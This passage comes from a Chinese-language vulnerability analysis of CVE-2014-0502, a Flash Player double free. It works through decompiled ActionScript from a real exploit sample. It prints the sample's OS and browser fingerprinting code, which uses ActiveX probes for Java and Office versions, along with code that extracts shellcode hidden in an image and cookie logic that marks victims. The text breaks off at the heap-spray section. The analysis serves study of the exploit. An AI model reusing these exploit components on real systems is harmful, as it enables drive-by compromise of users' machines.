
2. <a href="elink@744K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3k6i4u0K6L8$3&6S2L8q4)9J5k6i4g2@1k6r3q4D9L8r3q4K6i4K6u0W2k6h3c8#2i4K6u0r3i4K6N6q4K9r3q4E0L8r3g2F1i4K6u0r3M7%4u0A6k6r3S2S2M7U0p5^5N6s2u0#2M7%4c8U0L8$3#2Q4x3X3g2H3k6r3j5`.">Inscription: Thwarting ActionScript Web Attacks From Within</a>

3. <a href="elink@bfeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2@1M7Y4g2K6N6s2N6S2N6X3g2Q4x3X3g2U0L8$3#2Q4x3V1k6W2L8W2)9J5k6s2g2K6i4K6u0r3M7X3g2K6L8%4g2J5j5$3g2K6i4K6u0r3j5X3I4G2k6%4y4Q4x3V1k6K6M7r3W2V1k6i4u0D9j5h3u0K6i4K6u0V1j5X3I4G2k6#2)9J5c8X3c8W2k6i4m8Q4x3X3c8S2L8X3q4D9P5i4y4A6M7#2)9J5k6r3!0X3i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4y4q4)9J5k6o6l9#2x3o6u0Q4x3X3c8S2i4K6u0V1k6r3!0#2j5X3I4W2i4K6u0V1k6Y4u0W2k6g2)9J5k6s2y4@1L8%4u0&6i4K6u0r3">Deep analysis of CVE-2014-0502 — a double free story</a>

4. <a href="elink@27eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3c8W2i4K6u0W2N6s2g2@1M7%4m8D9N6i4y4Q4x3X3g2U0L8$3#2Q4x3V1k6@1N6i4c8G2M7X3W2S2L8s2y4Q4x3V1k6#2L8X3c8W2M7Y4y4@1j5h3&6V1K9h3&6Y4i4K6u0V1k6$3q4J5j5X3q4Y4k6g2)9J5k6r3y4G2L8r3I4W2j5%4c8A6L8$3&6Q4x3X3c8A6L8W2)9J5k6r3q4K6x3#2)9J5k6q4)9J5k6r3q4U0N6r3W2$3k6g2)9J5k6o6b7@1x3e0t1`.">Understanding Garbage Collection in AS3</a>

# 1. 前言

这次分析了CVE-2014-0502 Adobe Flash Player中的双重释放漏洞。文章的前半部分是Action Script代码的静态分析以及对于漏洞利用原理的一个初步分析，AS代码分析和书中内容重合，漏洞利用原理的初步分析涉及到了Adobe Flash Player的一些操作机制，通过搜索查看网上的资料完成了前半部分的内容；

后半部分集中在漏洞的动态调试上，目标是为了确定该漏洞在内存操作上的利用原理。由于双重释放的内存并不在堆中，而且没有在网上找到相关数据结构的资料，对于漏洞本身，网上能够找到的分析文章也并不深入（最详细的就是参考资料3了），因此分析过程并不顺利。最终通过断点调试、内存数据分析以及IDA静态代码的分析，得到了一个猜想上的结论（或许是关键字的原因，我并没有找到相关内存机制的资料）。

# 2. 静态代码分析

根据书中的描述，攻击者利用该漏洞构造了一个swf文件，并将文件嵌入网页中诱导用户访问，实现漏洞利用。之前[分析过CVE-2011-2110](https://bbs.pediy.com/thread-269080.htm)，是Adobe Flash Player中的数组越界访问漏洞，使用了JPEXS Free Flash Decompiler工具对swf文件进行反编译，这次使用同样的方法。在书籍配套资料中提供了构造好的swf文件`cc.swf`，拖入工具中查看反编译结果。

自动生成的反编译结果中有很多特殊字符，因此我根据每个函数或变量的功能对其名称进行了修改。

## 2.1 辅助函数分析

首先对代码中几个子功能辅助函数进行分析：

### 2.1.1 系统环境判断函数

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27 | ```public function detect_sys() : int {
var version:* = null;
var VerInt:Number = NaN;
var os:String = Capabilities.os.toLowerCase();
var language:String = Capabilities.language.toLowerCase();```
// 如果是xp系统，根据语言不同得到不同返回值
if(os == "windows xp") {
if(language == "zh-cn") {
return 1;
}
if(language == "en") {
return 2;
}
if(language == "zh-tw") {
return 3;
}
return 0;
}
// 如果是win7系统，会执行checkversion()函数
if(os == "windows 7") {
ExternalInterface.call("eval","function checkversion(){  var result;  var ua=window.navigator.userAgent.toLowerCase();  var temp=ua.replace(/ /g,"");  {    if(temp.indexOf("nt6.1")>-1&&temp.indexOf("msie")>-1&&temp.indexOf("msie10.0")==-1)    {      var java6=0;      var java7=0;      var a=0;      var b=0;      try {        java6=new ActiveXObject("JavaWebStart.isInstalled.1.6.0.0");       } catch(e){}      try {        java7=new ActiveXObject("JavaWebStart.isInstalled.1.7.0.0");       } catch(e){}      if(java6&&!java7)      {        return "16";      }      try {        a=new ActiveXObject("SharePoint.OpenDocuments.4");      } catch(e){}      try {        b=new ActiveXObject("SharePoint.OpenDocuments.3");      } catch(e){}            if((typeof a)=="object"&&(typeof b)=="object")      {        try {          location.href = 'ms-help://'        }catch(e){};        return "10";      }      else if((typeof a)=="number"&&(typeof b)=="object")      {        try {          location.href = 'ms-help://'        }catch(e){};        return "07";      }     }   }      return "0";}"
```
version = ExternalInterface.call("eval","checkversion()");
trace(version);
return Number(parseInt(version,10));
}
return 0;
}``` |

从代码可以看出这个漏洞利用代码针对的是xp系统中的中文版、中国台湾版以及英文版，win7系统会进一步执行`checkversion()`函数，该函数如下：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43 | ```function checkversion() {
var result;
var ua = window.navigator.userAgent.toLowerCase();
var temp = ua.replace(/ /g, "");
{
if(temp.indexOf("nt6.1") > -1 && temp.indexOf("msie") > -1 && temp.indexOf("msie10.0") == -1) {
var java6 = 0;
var java7 = 0;
var a = 0;
var b = 0;
try {
java6 = new ActiveXObject("JavaWebStart.isInstalled.1.6.0.0");
} catch(e) {}
try {
java7 = new ActiveXObject("JavaWebStart.isInstalled.1.7.0.0");
} catch(e) {}
// 如果安装了java1.6，且未安装java1.7，返回16
if(java6 && !java7) {
return "16";
}
try {
a = new ActiveXObject("SharePoint.OpenDocuments.4");
} catch(e) {}
try {
b = new ActiveXObject("SharePoint.OpenDocuments.3");
} catch(e) {}
// 安装了office 2010
if((typeof a)=="object" && (typeof b)=="object") {
try {
location.href = 'ms-help://'
} catch(e) {};
return "10";
// 安装了office 2007
}
else if((typeof a)=="number" && (typeof b)=="object") {
try {
location.href = 'ms-help://'
} catch(e) {};
return "07";
}
}
}
return "0";
}``` |

### 2.1.2 事件监听函数

这个函数用于在图片加载完成后执行：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15 | ```public function listener(e:Event) : void {
var bytes:ByteArray = new ByteArray();
// bytes的内容为logo.gif数据
bytes.writeBytes(e.target.data as ByteArray,0,(e.target.data as ByteArray).length);
bytes.position = bytes.length - 4;
bytes.endian = "littleEndian";
var len:uint = bytes.readUnsignedInt();
// 最后四个字节是shellcode长度
var shellbytes:ByteArray = new ByteArray();
// 读取shellcode内容
shellbytes.writeBytes(bytes,bytes.length - 4 - len,len);
shellbytes.position = 0;
// 设置共享变量mpsc为shellcode内容
worker.setSharedProperty("mpsc",shellbytes);
worker.start();
}``` |

通过该函数可以看到shellcode的内容就保存在要加载的图片中，其中最后四个字节保存的是shellcode的长度，根据该数据前向读取，获得shellcode的内容放入`mpsc`属性中。

### 2.1.3 设置cookie值

为了便于判断之前是否进行过漏洞利用，程序设置了cookie值`XPT20131111`：

|  |  |

| --- | --- |

| 1  2  3  4  5 | ```public function cookie_func() : * {
ExternalInterface.call("eval","function setcookie(){var Then = new Date(); Then.setTime(Then.getTime() + 1000 * 3600 * 24 * 7 );document.cookie = \"Cookie1=XPT20131111; expires=\"+ Then.toGMTString();}function CanIFuck(){var cookieString = new String(document.cookie);if(cookieString.indexOf(\"XPT20131111\") == -1){setcookie(); return 1;}else{ return 0;}}");
var ret:String = ExternalInterface.call("eval","CanIFuck()");
return parseInt(ret,10);
}``` |

里面的代码内容整理后得到：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14 | ```function setcookie() {
var Then = new Date();
Then.setTime(Then.getTime() + 1000 * 3600 * 24 * 7 );
document.cookie = "Cookie1=XPT20131111; expires=" + Then.toGMTString();
}
function CanIFuck() {
var cookieString = new String(document.cookie);
if (cookieString.indexOf("XPT20131111") == -1) {
setcookie();
return 1;
}
else {
return 0;
}
}``` |

### 2.1.4 堆喷射函数

堆喷射函数使用提供的参数构造一个大小为1MB的字节数组：

|  |  |

| --- | --- |
